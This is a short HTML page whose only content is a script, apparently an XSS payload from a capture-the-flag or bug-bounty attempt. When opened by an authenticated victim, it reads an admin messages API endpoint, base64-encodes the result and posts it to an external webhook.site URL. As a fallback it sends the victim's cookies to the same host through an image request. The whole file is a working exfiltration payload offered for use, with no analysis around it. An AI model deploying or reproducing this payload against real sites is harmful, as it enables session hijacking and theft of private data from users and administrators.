<!DOCTYPE html>
<html>
<body>
<script>
    (async () => {
        const webhook = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
        const msgId = "69ea8fcabee6d6b7c66463f6";
        
        try {
            // Attempt to fetch the raw JSON data for your message
            const response = await fetch(`/api/admin/messages/${msgId}`);
            const data = await response.text();
            
            // Send the data back to your webhook as a POST body
            await fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                body: btoa(data)
            });
        } catch (e) {
            // If fetch fails, at least try to leak the cookies
            new Image().src = `${webhook}/leak?cookie=${btoa(document.cookie)}`;
        }
    })();
</script>
</body>
</html>
